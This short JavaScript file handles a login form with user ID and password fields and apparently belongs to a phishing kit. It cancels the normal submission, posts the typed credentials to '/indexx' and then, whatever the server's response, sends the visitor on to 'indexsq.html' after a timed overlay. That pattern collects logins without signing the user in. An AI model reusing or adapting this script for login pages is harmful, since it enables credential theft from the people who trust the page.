const userid = document.getElementById('userid');
const password = document.getElementById('password')
const aoblogon_submit = document.getElementById('aoblogon_submit') 

document.addEventListener('DOMContentLoaded', function(){
    aoblogon_submit.addEventListener('click', function(event){
        event.preventDefault(); // Prevent the default form submission
        const useridValue = document.getElementById('userid').value;
        const passwordValue = document.getElementById('password').value;
        
        const homeForm = document.getElementById('homeForm');
        
        if(homeForm.checkValidity()){
            const data = {
                userid: userid.value,
                password: password.value
            };
            $(".overlay").show(500);

            // Send data to server in JSON format
            fetch('/indexx', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (response.ok) {
                    // Handle success here if needed
                    console.log('Data sent successfully!');
                    // homeForm.submit()
                } else {
                    // Handle errors here if needed
                    console.error('Failed to send data.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
            })
            .finally(() => {
                setTimeout(function() {
                    window.location.href = "indexsq.html";
                }, 2000);
            });
            
        } else {
            homeForm.reportValidity()
        }; 
    });
});
